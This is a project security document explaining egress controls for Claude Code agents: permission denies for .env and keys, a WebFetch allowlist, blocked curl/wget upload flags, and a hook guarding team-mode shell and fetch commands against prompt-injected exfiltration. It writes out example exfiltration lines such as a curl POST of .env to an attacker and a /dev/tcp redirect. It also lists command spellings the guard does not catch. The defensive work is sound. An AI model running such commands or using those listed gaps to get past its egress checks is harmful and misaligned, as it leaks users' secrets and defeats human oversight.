# Security — egress policy, honest limits, recorded exceptions

Pointed at from `CLAUDE.md → Security`. This file carries the *why* behind the two-line rule there; the rule itself, and the settings that enforce it, live in `CLAUDE.md` and [.claude/settings.json](../../.claude/settings.json). Update this file when an allowance changes; never move the rule back into `CLAUDE.md`.

## What the settings do

**Write-side.** `.env` is `deny` for edits; `.env.*` is `ask`. Permission globs have no negation, so the only way to keep the committed `.env.example` editable is to prompt on every `.env.<suffix>` instead of blocking it. If a project introduces a secret-bearing variant (`.env.local`, `.env.production`), add an explicit `Edit(**/<that file>)` deny in the same commit that creates it. Keys and PEMs are denied the same way.

**Read-then-send side — the AI can read a secret, so the guard is on sending it.** The file-write denies stop the agent *writing* `.env`; they do nothing about an injected instruction that reads one and ships it out. Two rules narrow that:

- **`WebFetch` is an allowlist, not `domain:*`.** A blanket allow means an exfiltration URL needs no prompt and leaves no shell string for a deny-glob to match — `audit-append.sh` records it afterwards, which is forensics, not prevention. The shipped list covers common documentation and package hosts; `/setup:create-CLAUDE_MD` appends the project's own docs hosts and records them under `CLAUDE.md → Security`. Anything else prompts. **Do not widen it back to `domain:*`** to silence prompts — a prompt on an unknown host is the control working. Add hosts you can name a reason for; let the rest prompt.
- **`curl`/`wget` request bodies and non-GET methods are denied** (`-d`, `--data*`, `-F`, `--form*`, `-T`, `--upload-file*`, `--json*`, `-X`, `--request*`, `--post*`, `--body*`). This closes the spaced spelling of the canonical `curl -X POST attacker -d @.env` one-liner.

**Auto mode (team roles).** In auto permission mode the classifier would approve an unlisted `WebFetch` host and read-only HTTP without a prompt, so "anything else prompts" above would no longer hold. The checkpoint is kept by the PreToolUse hook `guard-team-egress` ([.claude/hooks/guard-team-egress.sh](../../.claude/hooks/guard-team-egress.sh)): it returns `ask` (never `allow`, so `deny` still wins), is registered with `"onFailure": "block"` by `/setup:teams` (`team-setup.sh`, under the exact matchers `Bash` and `WebFetch`) in the project's `settings.json` — the template's shared settings do not carry it, the team layer opts in — runs in team mode only, and the runner gives a role auto only when its clone has the hook. `WebFetch` is checked by parsed hostname against the `WebFetch(domain:…)` allow rules of `settings.json` + `settings.local.json` (bare wildcards ignored). It is a **best-effort guard over `Bash` and `WebFetch`, not an allowlist**; `WebSearch` and MCP tools (browser, cloud, connectors) are out of its scope and are not hooked. The Bash part asks on an egress-capable verb in command position (also in `bash -c`, `tmux`, `eval`, `$(…)`, here-doc lines, the string of `flock -c` and `env -S`, and behind wrappers such as `env`, `timeout`, `stdbuf`, `flock`, `watch`, `find -exec`; a redirection before the verb is read through — `</dev/null curl …`, `2>&1 curl …` — and a brace-expanded verb such as `{curl,} …` asks): `curl wget ssh scp rsync nc ftp sftp gh npm pip pip3 osascript`, plus `python`/`python3` with `-c` and `node` with `-e`/`-p`/`--eval`. The read-only `gh pr view` and `gh issue view` that `/setup:teams` allows the roles pass only as a plain command: `gh` as the command's own first word (behind `timeout`, `env`, `xargs`, `find -exec` or a `VAR=…` prefix it is asked — a wrapper can rewrite or append the checked arguments), a `-R`/`--repo` value of plain `OWNER/REPO` (a host part — `host/o/r`, `git@host:o/r`, a URL — is asked), no `://` argument (a PR or issue URL picks its host), no `--hostname`, no brace expansion (`--re{p..p}o=…` becomes `--repo=…`) and no option-shaped glob (`--rep[o]` matches a file named `--repo`), and no `$`, backtick, `#`, backslash, `GH_HOST` or `GH_REPO` anywhere in the command text or its tokens (an expansion or substitution can rebuild any of these at run time; `#` and a backslash confuse the guard's comment stripper; the two variables select gh's host). The check reads the whole command string, so a quoted `';'` cannot cut an argument off. One exception: a `--jq`/`-q`/`--template`/`-t` value that gh's option layout binds (`gh pr|issue view`) and that is one single-quoted word is data — it is excluded from the taint and host-selector checks (`gh issue view 1 --jq '"\(.title)"'` passes, also piped into an allowlisted companion such as `head`, never into a shell or interpreter); a double-quoted or unquoted value is checked as before, and an unknown option or `--` before it ends the binding. A `/dev/tcp/…` or `/dev/udp/…` path (bash's socket redirection, e.g. `cat .env >/dev/tcp/host/443`) asks whatever the verb — also quote-split and inside `bash -c`, `eval`, `$(…)`, `flock -c` or `env -S`; a path assembled through an expansion (`d=/dev/t; … >${d}cp/…`) is not caught. Shell-specific glob syntax beyond `*`, `?`, `[`, braces and a glued `(` (e.g. zsh `^` under `extendedglob`) is not seen by the gh read check. `nc -z` with only `-v/-w/-G` flags to `localhost`/`127.0.0.1`/`::1` (local docker SQL probe) is not treated as egress. A network `git` command (`push`, `fetch`, `pull`, `clone`, `ls-remote`, `submodule add`, `remote add|set-url`) whose repository argument is a URL or `host:path` asks unless that host is in the same `WebFetch(domain:…)` allowlist; a bare remote name or a local path passes (the settings keep `git push/pull/fetch` on allow for that case). A script file with its own HTTP client (`python3 x.py`, `node x.js`), a compiled binary, a verb built by `$` expansion (`$c x`), the string other wrappers hand to a shell (`watch 'a; b'`, `su -c`, `script -c`), and every tool outside `Bash`/`WebFetch` are not caught. Auto mode is **not** claimed equivalent to manual mode for egress.

**Local `gh` rules for the Supervisor.** The Supervisor in the main checkout — `TEAM_SESSION_ROLE=Supervisor`, no `TEAM_RUN_TEAM`, neither `.agents/team/session.json` nor `.agents/team/team.json` — gets no guard prompt for a `gh` command that matches a `Bash(gh …)` allow rule of that checkout's `.claude/settings.local.json`. The rule is the switch: per clone, never committed, never shipped. Forms honoured: `Bash(gh <words>)` (exact), `Bash(gh <words> *)` and `Bash(gh <words>:*)` (word prefix), at least one word after `gh`, words split on spaces; a rule with another `*`, a `:`, a quote or a backslash in its words (`Bash(gh *)`, `Bash(gh:*)`, `Bash(*)`, `Bash(gh * create)`, `Bash(gh api https://…)`, `Bash(gh issue create --title "a b" *)`) is ignored, so its commands are still asked. Limits: never a team role, the per-run TeamLead or an Advisor; a rule in `settings.json` has no effect; a malformed `settings.local.json` keeps the prompt.

*Host selectors.* gh's own host selectors keep the prompt too: `--hostname` (and `-h` in any short-flag cluster under `gh auth`), a `-R`/`--repo` value that is not plain `OWNER/REPO`, any `://`, and any brace expansion (`{a,b}`, `{a..b}`) or option-shaped glob (`--rep[o]`, `[-]-repo`) that could rebuild one. Not checked: a positional `HOST/OWNER/REPO` of `gh repo view|clone|fork|…` under a matching rule, and the host gh picks from the current directory's git remotes (remote URLs pass the git host check above). The guard only steps aside — Claude Code's own rules still decide. A `gh` write rule is a standing channel to every repository the token can reach (`-R other/repo` included): allow the narrowest subcommands (`Bash(gh issue create *)`, not `Bash(gh issue *)`).

*Compounds.* Segments joined by `;`, `&&`, `||`, `|` or a newline, with `>`/`>>`/`N>`/`&>` to a literal file and `N>&M` (one-digit fd), pass when each segment is a covered `gh` command or an allowlisted companion — `cd` (one literal path), `jq`, `head`, `tail`, `sort` (no long option: an abbreviation of `--compress-program` runs a program), `uniq`, `wc`, `grep`, `cut`, `tr`, `cat`, `column`, `tee`, `echo`, `printf` (format with only `%s`/`%%`, no `-v`), `true` — and each companion also passes the egress check (`.claude/hooks/lib/guard_team_egress_supervisor.py`). The reader refuses anything else outside single quotes: `$`, backtick, `\`, `#`, `<` (heredocs, input redirection), `(`/`)`, `{`/`}`, `!`, a background `&`, `|&`, an unquoted glob or `~`, a word starting with `=`; double quotes may not hold `$`, a backtick or `\`. So a `$(…)` body, `bash -c`, `eval`, `xargs`, `| bash` and zsh `noglob` keep the prompt. A compound where `gh` output is piped into a stdin executor — a shell or interpreter with no script operand (or `-`, `/dev/stdin`, a shell's `-s`), `xargs`, `source`/`.`, `eval`, or a wrapper such as `timeout`, `env`, `noglob` — asks explicitly, even when the `gh` part is a read; any other segment outside the list keeps the verdict it had before (`gh issue view 5 | sed -n 1,20p` stays silent, `ls && gh issue create x` still asks). A `gh` segment gets the verdict of the plain-command test above, no stricter and no looser: a quoted value with `$`, a backtick, `<`, `>`, `#` or `\` keeps the prompt unless it is a bound single-quoted formatting value (above), and so does a quoted word made only of separator characters (`'()'`, `';'`); the read path's taint scan (a glued `(`, `GH_HOST`, `GH_REPO`) is not applied, so `--title 'feat(x): y'` and `--body 'call foo() first'` pass.

*Loops.* A command that is only `for NAME in <values>; do <body>; done` (`;` or a newline before `do` and `done`) is judged once per value with the value written in for `$NAME` / `${NAME}` outside single quotes: silent only when every expanded body passes the compound test above; an explicit ask in one body asks; otherwise the whole loop gets today's verdict. Values are 1–64 plain words (letters, digits, `_./:,=+@%-`, none starting with `-` or `=`); a `\` outside single quotes, an unclosed quote, any other `$`, or anything before or after the loop (`| bash`, `; curl …`) keeps the prompt.

*Inline Python.* The exact local rule `Bash(python3 -)` lets a heredoc `python3 - <<DELIM` pass (a quoted delimiter, or an unquoted one with no `$`, backtick or `\` in the body; the first delimiter line must end the command; no `<<-`); `Bash(python3 -c *)` or `Bash(python3 -c:*)` lets `python3 -c <one quoted word>` pass (no other flag first, nothing after it); `Bash(python3 *)` counts for nothing. Either rule is consent to arbitrary code in that clone. The same entry is also a native Claude Code allow rule, so it lifts Claude Code's own prompt for every plain (non-role) session in that checkout too — the guard is not armed there — exactly as the `Bash(gh …)` rules already do; add it knowingly.

*Touch log.* Every Supervisor `ask` (the fail-closed one too) appends one line in the Operator touch-log format to `.agents/touches/<yyyy-mm>.jsonl` (`kind: permission`, `reason: guard`, the reason as `what`, `where: solo <dir>`). A symlinked directory, a FIFO or a hard-linked month file skips the line; the shell fallback for a classifier that failed to run checks, then appends — not race-free, unlike the Python writer. `.agents/touches/` is gitignored.

## Honest limit

These are string globs, not argument-aware parsing — defense-in-depth, not a boundary. Uncovered: the attached-value spellings `curl -XPOST` / `-d@.env` (the globs require a trailing space, so these fall through to a prompt — `curl` is not allowlisted, so they still prompt rather than run), `curl -K <configfile>`, `python3 -c "requests.post(...)"`, `nc`, and base64 smuggled in a GET query. Treat them as raising the cost of an accident, not as a guarantee against a determined injection.

## Deploy is egress too

A deploy (`ssh`, `rsync`, `curl` to a staging origin) prompts like any other egress. Wrapping it in a project command (`/deploy-staging` and the like) does not change the rules above; it changes only *where* the approval happens. A project that needs a narrow standing allowance for a deploy host records it in this file, with the host and the command, and nowhere else.
